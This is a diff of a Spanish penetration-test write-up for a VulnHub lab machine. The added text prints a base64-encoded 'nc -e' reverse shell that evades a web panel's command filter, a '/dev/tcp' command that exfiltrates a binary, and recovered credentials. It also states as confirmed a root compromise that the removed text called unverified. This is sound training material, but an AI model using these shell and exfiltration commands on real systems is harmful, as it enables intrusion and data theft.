@@ -1,452 +1,357 @@
-# Earth Secure Messaging \| Informe Técnico de Auditoría (Enumeración web, cifrado XOR y escalada de privilegios)
+# Planet | Informe Técnico de Auditoría (Criptoanálisis XOR + binario SUID con puerta trasera)
 
-Informe técnico de la evaluación de seguridad Boot2Root realizada sobre
-la máquina **Earth Secure Messaging**, del entorno VulnHub. La
-investigación incluyó el reconocimiento de servicios, la enumeración de
-recursos web, el análisis de pistas relacionadas con el cifrado XOR, el
-acceso al panel administrativo como `terra`, la ejecución de comandos
-como `apache` y el análisis del binario SUID `/usr/bin/reset_root`.
+Informe de la prueba de intrusión Boot2Root ejecutada sobre la máquina **Planet**, un servidor Fedora que aloja una aplicación web personalizada de mensajería cifrada ("Earth Secure Messaging"). El acceso inicial se obtuvo recuperando la contraseña del panel de administración mediante un **ataque de texto plano conocido** contra un cifrado XOR débil, y evadiendo después el filtro de comandos de dicho panel. La escalada a `root` se logró mediante **ingeniería inversa** de un binario SUID personalizado que concedía privilegios bajo una condición oculta.
 
-El reconocimiento y varias fases de la investigación están documentados
-mediante capturas. **La escalada final a `root` no se considera
-confirmada** hasta obtener una evidencia que muestre el contexto
-privilegiado en la máquina objetivo y la lectura de la bandera final.
+&nbsp;
 
-------------------------------------------------------------------------
+---
+
+&nbsp;
 
 ## Ficha técnica
 
-  -----------------------------------------------------------------------
-  Campo                               Detalle
-  ----------------------------------- -----------------------------------
-  Nombre de la máquina                Earth Secure Messaging
+| Campo | Detalle |
+| :-- | :-- |
+| Nombre de la máquina | Planet |
+| Plataforma | VulnHub |
+| Sistema operativo | Linux (Fedora) |
+| Servicio objetivo | Aplicación web "Earth Secure Messaging" sobre Apache 2.4.51 + mod_wsgi + Python 3.9 |
+| Dirección IP del objetivo | 10.0.2.6 |
+| Puertos expuestos | 22/tcp (SSH), 80/tcp (HTTP), 443/tcp (HTTPS) |
+| Nombres de host virtuales | `earth.local`, `terratest.earth.local` |
+| Vulnerabilidad principal | Cifrado XOR débil (ataque de texto plano conocido) y filtro de comandos insuficiente en el panel admin |
+| Vector de escalada | Binario SUID personalizado (`reset_root`) con lógica de activación oculta |
+| Objetivo del ejercicio | Compromiso total como `root` |
 
-  Plataforma                          VulnHub
+&nbsp;
 
-  Dirección IP del objetivo           `10.0.2.6`
+---
 
-  Dirección IP de Kali Linux          `10.0.2.15`
+&nbsp;
 
-  Dominios identificados              `earth.local`,
-                                      `terratest.earth.local`
+## Resumen de la cadena de ataque
 
-  Sistema / servidor web identificado Fedora, Apache httpd 2.4.51,
-                                      mod_wsgi/4.7.1, Python 3.9
+| Fase | Técnica | Resultado |
+| :-- | :-- | :-- |
+| Reconocimiento | `nmap` + identificación de hosts virtuales vía certificado SSL | Identificación de `earth.local` y `terratest.earth.local` |
+| Enumeración | `gobuster` + `robots.txt` | Panel `/admin/` y notas internas de pruebas expuestas |
+| Criptoanálisis | Ataque de texto plano conocido contra el cifrado XOR (CyberChef) | Contraseña del panel de administración recuperada |
+| Explotación | Evasión del filtro de comandos del panel admin | Shell remota como usuario de servicio |
+| Post-explotación | Ingeniería inversa de un binario SUID con `ltrace` | Mecanismo oculto de reseteo de la contraseña de `root` identificado |
+| Escalada de privilegios | Activación del mecanismo oculto del binario | Contraseña de `root` conocida, acceso total |
 
-  Puertos expuestos                   `22/tcp` (SSH), `80/tcp` (HTTP),
-                                      `443/tcp` (HTTPS)
+&nbsp;
 
-  Usuario del panel administrativo    `terra`
+---
 
-  Usuario efectivo de la CLI web      `apache`
-
-  Binario SUID investigado            `/usr/bin/reset_root`
-
-  Técnicas principales                Nmap, Gobuster, análisis de XOR,
-                                      enumeración SUID y `ltrace`
-
-  Objetivo del ejercicio              Investigar el acceso inicial y
-                                      verificar si es posible escalar
-                                      privilegios hasta `root`
-  -----------------------------------------------------------------------
-
-------------------------------------------------------------------------
-
-## Resumen de la cadena de investigación
-
-  -----------------------------------------------------------------------
-  Fase                    Técnica                 Resultado
-  ----------------------- ----------------------- -----------------------
-  Reconocimiento          Escaneo de servicios    Identificación de SSH,
-                          con `nmap`              HTTP y HTTPS en el
-                                                  objetivo
-
-  Enumeración web         `gobuster` y revisión   Identificación del
-                          de `robots.txt`         panel `/admin/` y
-                                                  recursos adicionales
-
-  Análisis de pistas      Revisión de             Las notas mencionan el
-                          `testingnotes.txt` y    uso de XOR y de
-                          `testdata.txt`          `testdata.txt` durante
-                                                  las pruebas
-
-  Análisis de mensajes    Inspección del HTML y   Se identificaron
-                          de cadenas              mensajes cifrados; el
-                          hexadecimales           resultado del
-                                                  descifrado debe
-                                                  verificarse
-
-  Acceso administrativo   Inicio de sesión en     Acceso al panel como
-                          `/admin/`               `terra`
-
-  Ejecución de comandos   CLI del panel y comando Confirmación del
-                          `whoami`                usuario efectivo
-                                                  `apache`
-
-  Enumeración local       Búsqueda de binarios    Identificación de
-                          SUID                    `/usr/bin/reset_root`
-
-  Análisis del binario    Transferencia a Kali y  Identificación de tres
-                          ejecución de `ltrace`   rutas comprobadas
-                                                  mediante `access()`
-
-  Escalada de privilegios Verificación de         Pendiente de
-                          desencadenantes y nueva confirmación; el
-                          ejecución               binario había indicado
-                                                  que faltaban
-                                                  desencadenantes
-  -----------------------------------------------------------------------
-
-------------------------------------------------------------------------
+&nbsp;
 
 ## 1. Reconocimiento y enumeración de servicios
 
-### 1.1. Escaneo de puertos
+### 1.1. Escaneo de puertos y servicios
 
-Se ejecutó un escaneo de detección de servicios contra el objetivo:
+Se ejecutó un escaneo de versiones y scripts por defecto contra el objetivo:
 
-``` bash
+```bash
 nmap -sCV 10.0.2.6
 ```
 
-El resultado identificó los siguientes servicios:
+El resultado mostró tres servicios activos: `SSH` (OpenSSH 8.6), `HTTP` (Apache 2.4.51 sobre Fedora, con mod_wsgi y Python 3.9) y el mismo servicio sobre `HTTPS`. El certificado TLS reveló dos nombres de host virtuales: `earth.local` y `terratest.earth.local`, que fue necesario añadir a `/etc/hosts` para continuar la enumeración por nombre en lugar de por dirección IP.
 
-  -----------------------------------------------------------------------
-  Puerto                  Estado                  Servicio / información
-  ----------------------- ----------------------- -----------------------
-  `22/tcp`                Abierto                 OpenSSH 8.6
+![Escaneo de puertos con Nmap](./img/01-nmap-scan.png)
 
-  `80/tcp`                Abierto                 Apache httpd 2.4.51
-                                                  (Fedora),
-                                                  mod_wsgi/4.7.1, Python
-                                                  3.9
+&nbsp;
 
-  `443/tcp`               Abierto                 HTTPS sobre Apache
-                                                  httpd 2.4.51 (Fedora),
-                                                  mod_wsgi/4.7.1, Python
-                                                  3.9
-  -----------------------------------------------------------------------
+### 1.2. Enumeración de rutas en los hosts virtuales
 
-El certificado TLS presentó los nombres DNS `earth.local` y
-`terratest.earth.local`.
+Se enumeraron directorios y archivos sobre ambos nombres de host:
 
-![Escaneo de servicios con Nmap](./evidencias/01-nmap-servicios.png)
-
-### 1.2. Enumeración de rutas web
-
-Se enumeraron directorios y archivos en ambos dominios:
-
-``` bash
+```bash
 gobuster dir -u https://earth.local -w /usr/share/wordlists/dirb/common.txt -k
 gobuster dir -u https://terratest.earth.local -w /usr/share/wordlists/dirb/common.txt -k
 ```
 
-En `earth.local` se identificó `/admin/`, que redirige a la ruta del
-panel administrativo, y `cgi-bin/`, que devolvió un código `403`. En
-`terratest.earth.local` se identificaron recursos como `robots.txt` e
-`index.html`, además de rutas restringidas.
+En `earth.local` se localizó un panel `/admin/`; en `terratest.earth.local` se identificaron rutas adicionales de menor relevancia directa.
 
-![Enumeración de rutas con
-Gobuster](./evidencias/02-gobuster-enumeracion.png)
+![Enumeración de rutas en ambos hosts virtuales](./img/02-gobuster-vhosts.png)
 
-### 1.3. Revisión de `robots.txt` y archivos de prueba
+&nbsp;
 
-Se consultaron los recursos encontrados:
+### 1.3. Archivos de prueba expuestos
 
-``` bash
+La revisión de `robots.txt` en `terratest.earth.local` reveló una entrada fuera del listado habitual de extensiones bloqueadas:
+
+```bash
 curl -k https://terratest.earth.local/robots.txt
+```
+
+![robots.txt con una ruta de notas de pruebas](./img/03-robots-txt.png)
+
+Esa ruta llevó a un fichero de notas internas del equipo de desarrollo, que reveló el uso de **cifrado XOR**, el nombre de usuario `terra` para el panel admin y la existencia de un fichero de datos de prueba:
+
+```bash
 curl -k https://terratest.earth.local/testingnotes.txt
+```
+
+![Notas internas de pruebas](./img/04-testingnotes.png)
+
+El fichero de datos de prueba mencionado resultó ser un texto en claro, útil como base para un ataque de texto plano conocido contra el cifrado XOR:
+
+```bash
 curl -k https://terratest.earth.local/testdata.txt
 ```
 
-Las notas de pruebas indican que el sistema utiliza XOR y que
-`testdata.txt` se empleó para probar el cifrado. También identifican
-`terra` como el nombre de usuario del panel administrativo. La página
-principal contiene mensajes representados mediante cadenas
-hexadecimales.
+![Datos de prueba en texto plano](./img/05-testdata.png)
 
-![Contenido de robots.txt](./evidencias/03-robots-txt.png)
+&nbsp;
 
-![Notas de pruebas de la aplicación](./evidencias/04-testingnotes.png)
+---
 
-![Contenido de testdata.txt](./evidencias/05-testdata.png)
+&nbsp;
 
-### 1.4. Análisis de los mensajes cifrados
+## 2. Criptoanálisis y acceso al panel de administración
 
-Se guardó el HTML de la página principal para examinar las cadenas
-hexadecimales:
+### 2.1. Página principal y mensajes cifrados
 
-``` bash
-curl -k https://earth.local/ -o pagina-principal.html
+La página principal de `earth.local` mostró un formulario de envío de mensajes cifrados y un listado de mensajes previos en formato hexadecimal, cifrados presumiblemente con el mismo esquema XOR descrito en las notas internas.
+
+```bash
+curl -k https://earth.local/
 ```
 
-Las notas apuntan a XOR como algoritmo utilizado. Para considerar el
-descifrado demostrado, es necesario registrar la cadena de entrada, la
-clave exacta, la representación de los bytes y una salida legible
-reproducible. Las evidencias disponibles muestran las pistas y los
-mensajes cifrados, pero no bastan por sí solas para confirmar una
-contraseña concreta.
+![Formulario de mensajería y mensajes cifrados](./img/06-earth-local-mensajes.png)
 
-![Mensajes cifrados de la página
-principal](./evidencias/06-mensajes-cifrados.png)
+&nbsp;
 
-![Análisis XOR](./evidencias/07-analisis-xor.png)
+### 2.2. Ataque de texto plano conocido contra el cifrado XOR
 
-------------------------------------------------------------------------
+Utilizando el texto en claro de `testdata.txt` como clave de referencia contra uno de los mensajes cifrados capturados, se realizó un ataque de texto plano conocido con CyberChef (`From Hex` + `XOR`). El resultado reveló un patrón repetido en claro:
 
-## 2. Acceso al panel administrativo
-
-### 2.1. Inicio de sesión como `terra`
-
-Se accedió a:
-
-``` text
-https://earth.local/admin/
+```
+earthclimatechangebad4human
 ```
 
-El panel requiere autenticación. El usuario utilizado fue `terra`, de
-acuerdo con la pista encontrada en los recursos de prueba. No se
-incluyen contraseñas en claro en este informe.
+![Ataque de texto plano conocido con CyberChef](./img/07-cyberchef-xor.png)
 
-![Inicio de sesión del panel
-administrativo](./evidencias/08-login-admin.png)
+&nbsp;
 
-### 2.2. Confirmación del usuario efectivo
+### 2.3. Acceso al panel de administración
 
-Desde la herramienta **Admin Command Tool** se ejecutó:
+Con el usuario `terra` (obtenido de las notas internas) y la contraseña recuperada en el paso anterior, se accedió al panel de administración:
 
-``` bash
-whoami
+```
+https://earth.local/admin/login
 ```
 
-La salida fue:
+![Panel de acceso administrativo](./img/08-admin-login.png)
 
-``` text
-apache
+&nbsp;
+
+| Credencial | Valor | Origen |
+| :-- | :-- | :-- |
+| Usuario del panel admin | `terra` | Notas internas (`testingnotes.txt`) |
+| Contraseña del panel admin | `earthclimatechangebad4human` | Ataque de texto plano conocido contra el cifrado XOR |
+
+&nbsp;
+
+---
+
+&nbsp;
+
+## 3. Explotación — evasión del filtro de comandos
+
+El panel de administración incluía una herramienta de ejecución de comandos ("Admin Command Tool") con una restricción explícita: *"Remote connections are forbidden"*. Dicha restricción se evadió codificando el payload en base64, de forma que el filtro no reconociera directamente la invocación de una herramienta de red.
+
+### 3.1. Codificación del payload
+
+```bash
+echo -n 'nc -e /bin/bash 10.0.2.15 4444' | base64
 ```
 
-Esto confirma que los comandos enviados desde la CLI web se ejecutan
-como el usuario de servicio `apache`, no como `root`.
+![Codificación del payload en base64](./img/09-payload-base64.png)
 
-![Confirmación de ejecución como
-apache](./evidencias/09-cli-whoami-apache.png)
+&nbsp;
 
-------------------------------------------------------------------------
+### 3.2. Ejecución a través del panel de administración
 
-## 3. Enumeración local y análisis de SUID
+El payload codificado se decodificó y ejecutó directamente desde el campo de comando del panel:
 
-### 3.1. Enumeración de binarios SUID
-
-Se ejecutó la búsqueda de archivos con el bit SUID:
-
-``` bash
-find / -type f -perm -4000 -ls 2>/dev/null
+```
+... | base64 -d | bash
 ```
 
-Entre los resultados aparecieron binarios del sistema como `sudo`,
-`pkexec`, `passwd`, `su` y el ejecutable personalizado
-`/usr/bin/reset_root`.
+![Ejecución del payload a través del Admin Command Tool](./img/10-admin-command-tool-payload.png)
 
-El binario `reset_root` llamó la atención porque pertenece a `root` y
-tiene habilitado el bit SUID. Esto justifica analizar su comportamiento,
-pero no demuestra por sí solo que sea explotable.
+&nbsp;
 
-![Enumeración de binarios SUID](./evidencias/10-suid-enumeracion.png)
+### 3.3. Obtención de shell reversa
 
-### 3.2. Ejecución inicial de `reset_root`
+Con un listener preparado en el equipo atacante, la ejecución del payload devolvió una conexión interactiva en el contexto del usuario de servicio del servidor web.
 
-Se ejecutó:
-
-``` bash
-/usr/bin/reset_root
+```bash
+nc -lvnp 4444
 ```
 
-El programa mostró:
+![Shell reversa obtenida](./img/11-shell-reversa.png)
 
-``` text
-CHECKING IF RESET TRIGGERS PRESENT...
-RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
+&nbsp;
+
+---
+
+&nbsp;
+
+## 4. Post-explotación — identificación de un binario SUID
+
+### 4.1. Enumeración de binarios con bit SUID
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
 ```
 
-Por tanto, la ejecución inicial no restableció la contraseña de `root`.
+Entre los binarios habituales del sistema destacó uno no estándar: `/usr/bin/reset_root`, ajeno a una instalación por defecto de Fedora.
 
-![Ejecución inicial fallida de
-reset_root](./evidencias/11-reset-root-fallo.png)
+![Enumeración de binarios SUID](./img/12-suid-enumeracion.png)
 
-------------------------------------------------------------------------
+&nbsp;
 
-## 4. Transferencia y análisis de `reset_root`
+### 4.2. Exfiltración del binario para su análisis
 
-### 4.1. Recepción del binario en Kali
+Dado que la restricción de conexiones remotas también aplicaba a este canal, se repitió la técnica de evasión, esta vez empleando una redirección de shell (`/dev/tcp`) en lugar de una herramienta de red explícita, para extraer el binario y analizarlo localmente:
 
-Se preparó un listener en Kali para recibir el archivo:
-
-``` bash
+```bash
 nc -lvnp 3333 > reset_root
 ```
 
-La salida del listener confirmó una conexión procedente de `10.0.2.6`.
-Tras la transferencia, el archivo debe validarse en Kali:
+![Listener preparado para recibir el binario](./img/13-nc-listener-exfiltracion.png)
 
-``` bash
-file reset_root
-ls -lh reset_root
-readelf -h reset_root
+El comando de lectura se ejecutó nuevamente a través del panel de administración:
+
+![Lectura del binario desde el Admin Command Tool](./img/14-admin-command-tool-exfiltracion.png)
+
+```bash
+cat /usr/bin/reset_root > /dev/tcp/10.0.2.15/3333
 ```
 
-La transferencia solo se considera verificada si el archivo tiene tamaño
-no nulo y las herramientas reconocen su formato ELF.
+![Redirección del binario vía /dev/tcp](./img/15-comando-devtcp.png)
 
-![Transferencia de reset_root a
-Kali](./evidencias/12-transferencia-reset-root.png)
+La transferencia se completó correctamente, dejando una copia local del binario para su análisis.
 
-### 4.2. Análisis con `ltrace`
+![Binario reset_root recibido localmente](./img/16-binario-recibido.png)
 
-Se ejecutó el análisis de llamadas a bibliotecas:
+&nbsp;
 
-``` bash
+### 4.3. Ingeniería inversa con ltrace
+
+El análisis dinámico del binario reveló su lógica interna: comprueba la existencia de tres ficheros concretos (dos en `/dev/shm` y uno en `/tmp`, con nombres aleatorios fijos) antes de proceder a restablecer la contraseña de `root`.
+
+```bash
 ltrace ./reset_root
 ```
 
-La salida observada fue:
+![Análisis del binario con ltrace](./img/17-ltrace-reset-root.png)
 
-``` text
-access("/dev/shm/kHgTFI5G", 0) = -1
-access("/dev/shm/Zw7bV9U5", 0) = -1
-access("/tmp/kcM0Wewe", 0) = -1
+&nbsp;
+
+---
+
+&nbsp;
+
+## 5. Escalada de privilegios
+
+### 5.1. Creación de los ficheros disparadores
+
+De vuelta en la shell obtenida sobre el objetivo, se crearon los tres ficheros identificados en el análisis anterior:
+
+```bash
+touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
 ```
 
-El resultado muestra que la copia analizada comprobó tres rutas y que
-las tres llamadas a `access()` fallaron durante esa ejecución.
+![Creación de los ficheros disparadores](./img/18-creacion-triggers.png)
 
-![Rutas comprobadas por ltrace](./evidencias/13-ltrace-rutas.png)
+&nbsp;
 
-### 4.3. Interpretación de las rutas
+### 5.2. Ejecución del binario y obtención de la contraseña de root
 
-Las rutas que aparecen en la salida deben copiarse literalmente:
+Con los ficheros disparadores presentes, la ejecución del binario reveló y aplicó una nueva contraseña para la cuenta `root`:
 
-  N.º   Ruta observada
-  ----- ---------------------
-  1     `/dev/shm/kHgTFI5G`
-  2     `/dev/shm/Zw7bV9U5`
-  3     `/tmp/kcM0Wewe`
+```bash
+./reset_root
+```
 
-En una comprobación anterior se había utilizado `/tmp/kcM0Wew`, que no
-coincide con la ruta completa mostrada por `ltrace`. Aun así, crear
-archivos con esos nombres no basta para afirmar que el programa
-funcionará: también debe comprobarse que el binario de Earth usa las
-mismas rutas y que el proceso puede ver los archivos.
+```
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+```
 
-**Nota:** `ltrace` se ejecutó sobre una copia en Kali. La salida
-describe esa ejecución; debe contrastarse con el comportamiento del
-binario original en Earth.
+![Ejecución del binario con los disparadores presentes](./img/19-ejecucion-reset-root.png)
 
-![Verificación de las rutas en
-Earth](./evidencias/14-verificacion-rutas.png)
+&nbsp;
 
-------------------------------------------------------------------------
+---
 
-## 5. Estado de la escalada de privilegios
+&nbsp;
 
-La escalada final a `root` todavía no está confirmada por las evidencias
-disponibles. Para cerrar esta fase, el informe debe incluir una
-comprobación ejecutada en el objetivo que muestre el contexto
-privilegiado, por ejemplo, la salida de `id` con `uid=0(root)`, y la
-evidencia de lectura de la bandera final.
+## 6. Evidencia final
 
-Hasta que esas pruebas existan, el resultado debe registrarse como
-**pendiente de verificación**, no como compromiso total confirmado.
+Con la contraseña de `root` conocida, se accedió a dicha cuenta y se confirmó el compromiso total del sistema mediante la lectura de la bandera final:
 
-![Confirmación de root](./evidencias/15-root-confirmacion.png)
+```bash
+su root
+cd /root
+cat root_flag.txt
+```
 
-![Bandera final](./evidencias/16-root-flag.png)
+```
+[root_flag_b0da9554d29db2117b02aa8b66ec492e]
+```
 
-------------------------------------------------------------------------
+![Bandera final como root](./img/20-root-flag-final.png)
 
-## 6. Resumen de resultados
+&nbsp;
 
-  ------------------------------------------------------------------------------
-  Elemento                Ubicación / evidencia          Estado
-  ----------------------- ------------------------------ -----------------------
-  Servicios SSH, HTTP y   Escaneo Nmap                   Confirmado
-  HTTPS                                                  
+---
 
-  Panel administrativo    `https://earth.local/admin/`   Confirmado
+&nbsp;
 
-  Pistas de XOR           `robots.txt`,                  Confirmadas
-                          `testingnotes.txt`,            
-                          `testdata.txt`                 
+## 7. Resumen de banderas y credenciales obtenidas
 
-  Acceso como `terra`     Panel administrativo           Confirmado
+| Elemento | Valor / ubicación | Método de obtención |
+| :-- | :-- | :-- |
+| Usuario panel admin | `terra` | Notas internas (`testingnotes.txt`) |
+| Contraseña panel admin | `earthclimatechangebad4human` | Ataque de texto plano conocido contra el cifrado XOR |
+| Contraseña de `root` | `Earth` | Activación del binario `reset_root` mediante ficheros disparadores |
+| Bandera final | `/root/root_flag.txt` | Lectura tras la escalada de privilegios a `root` |
 
-  Ejecución como `apache` `whoami` en la CLI web         Confirmado
+&nbsp;
 
-  Binario SUID            `/usr/bin/reset_root`          Confirmado
-  investigado                                            
+---
 
-  Rutas comprobadas por   Copia de `reset_root`          Confirmadas para esa
-  `ltrace`                analizada en Kali              copia
+&nbsp;
 
-  Escalada a `root`       Evidencia final pendiente      No confirmada
+## 8. Causa raíz y remediación
 
-  Bandera final           Evidencia pendiente            No confirmada
-  ------------------------------------------------------------------------------
+| Hallazgo | Causa raíz | Recomendación |
+| :-- | :-- | :-- |
+| Cifrado XOR con clave corta y reutilizada | Uso de un algoritmo de cifrado inadecuado para datos sensibles | Sustituir XOR por un esquema de cifrado autenticado (p. ej. AES-GCM) con claves únicas y de longitud adecuada |
+| Notas internas y datos de prueba accesibles públicamente | Ficheros de desarrollo expuestos y referenciados en `robots.txt` | Retirar ficheros de prueba y documentación interna del entorno de producción; no depender de `robots.txt` como control de acceso |
+| Filtro de comandos basado en palabras clave en el panel admin | Validación de entrada insuficiente, evadible mediante codificación y redirecciones de shell | Eliminar la ejecución arbitraria de comandos o sustituirla por una lista blanca estricta de acciones predefinidas |
+| Binario SUID personalizado con lógica de activación oculta | Mecanismo de "puerta trasera" basado en la existencia de ficheros predecibles | Eliminar binarios SUID personalizados innecesarios y auditar periódicamente con `find -perm -4000` |
 
-------------------------------------------------------------------------
+&nbsp;
 
-## 7. Causa raíz y recomendaciones
+---
 
-  -----------------------------------------------------------------------
-  Hallazgo                Riesgo / causa          Recomendación
-  ----------------------- ----------------------- -----------------------
-  Panel web con capacidad Una interfaz web que    Eliminar la ejecución
-  de ejecutar comandos    permite ejecutar        arbitraria de comandos;
-                          comandos puede ampliar  si una función
-                          el impacto de fallos de administrativa la
-                          autenticación o         requiere, usar una
-                          autorización            lista permitida y
-                                                  privilegios mínimos
+&nbsp;
 
-  Recursos de pruebas     Las notas y los datos   Retirar archivos de
-  expuestos               de prueba revelan       desarrollo y pruebas de
-                          detalles de             los entornos publicados
-                          implementación y pueden 
-                          facilitar el análisis   
-                          de la aplicación        
+## 9. Lecciones aprendidas
 
-  Uso de XOR para         XOR sin un diseño       Utilizar criptografía
-  proteger mensajes       criptográfico robusto   autenticada moderna y
-                          no proporciona          una gestión segura de
-                          protección adecuada por claves
-                          sí solo                 
+- El cifrado XOR con una clave corta es trivialmente vulnerable a un ataque de texto plano conocido cuando un atacante puede acceder tanto al texto plano como al texto cifrado correspondiente.
+- Los ficheros de notas internas o de pruebas, aunque no estén enlazados directamente, pueden descubrirse a través de mecanismos como `robots.txt`.
+- Un filtro de palabras clave para restringir comandos es insuficiente: la codificación en base64 y las redirecciones de shell (`/dev/tcp`) evaden fácilmente este tipo de controles.
+- Un binario SUID personalizado con una condición de activación oculta representa un riesgo crítico si su comportamiento puede inferirse mediante ingeniería inversa dinámica (`ltrace`, `strace`).
 
-  Binario personalizado   Un fallo en un programa Eliminar SUID si no es
-  con SUID                privilegiado puede      imprescindible, auditar
-                          permitir escalada de    el código y reducir las
-                          privilegios             operaciones
-                                                  privilegiadas
+&nbsp;
 
-  Servicios que requieren Versiones antiguas      Mantener el sistema y
-  mantenimiento           pueden contener         los servicios
-                          vulnerabilidades        actualizados y revisar
-                          conocidas               periódicamente su
-                                                  configuración
-  -----------------------------------------------------------------------
+---
 
-------------------------------------------------------------------------
+&nbsp;
 
-## 8. Lecciones aprendidas
-
--   La enumeración de dominios, rutas y archivos auxiliares puede
-    revelar información que no aparece en la página principal.
--   Los mensajes hexadecimales requieren identificar correctamente el
-    formato, la clave y el funcionamiento real del algoritmo antes de
-    dar por válido un descifrado.
--   `whoami` permite confirmar el usuario efectivo con el que se
-    ejecutan los comandos del panel.
--   La presencia de un binario SUID requiere investigación, pero no
-    demuestra por sí sola que exista una vulnerabilidad explotable.
--   Los resultados de `ltrace` obtenidos en Kali deben contrastarse con
-    el comportamiento del binario en el objetivo.
--   Un informe de auditoría debe distinguir entre hallazgos confirmados,
-    hipótesis y fases pendientes de validación.
